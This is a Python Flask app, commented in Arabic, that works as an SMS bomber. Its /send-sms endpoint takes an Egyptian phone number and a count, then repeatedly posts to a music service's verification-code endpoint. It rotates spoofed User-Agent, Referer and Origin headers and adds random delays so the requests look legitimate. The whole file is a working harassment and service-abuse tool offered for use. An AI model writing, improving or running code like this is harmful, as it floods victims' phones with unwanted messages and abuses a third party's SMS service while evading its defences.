from flask import Flask, request, jsonify, render_template
import requests
import json
import time
import random
import string

app = Flask(__name__, template_folder='.')

# رابط API الخاص بالإرسال
url = "https://api.twistmena.com/music/Dlogin/sendCode"

# قائمة User-Agent متنوعة
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
]

referers = [
    "https://www.google.com",
    "https://www.bing.com",
]

origin_urls = [
    "https://www.example.com",
    "https://www.someotherdomain.com",
]

# دالة لتوليد الهيدر العشوائي
def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": random.choice(referers),
        "Origin": random.choice(origin_urls),
    }

# دالة لتوليد نص عشوائي
def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# API للتعامل مع الإرسال
@app.route('/send-sms', methods=['POST'])
def send_sms():
    data = request.get_json()
    number = data.get("number")
    try:
        sms_count = int(data.get("count", 1))
    except:
        return jsonify({"error": "عدد الرسائل غير صحيح"}), 400

    # التحقق من الرقم
    if not number.startswith("01") or len(number) != 11:
        return jsonify({"error": "الرقم غير صحيح. يجب أن يبدأ بـ 01 ويكون 11 رقمًا."}), 400

    number = "2" + number  # إضافة كود مصر

    success_count = 0
    failure_count = 0

    for i in range(sms_count):
        payload = json.dumps({"dial": number, "randomValue": random_string()})
        headers = get_headers()
        try:
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
        except Exception as e:
            failure_count += 1
        time.sleep(random.uniform(1, 3))

    return jsonify({
        "success_count": success_count,
        "failure_count": failure_count
    })

# الصفحة الرئيسية
@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)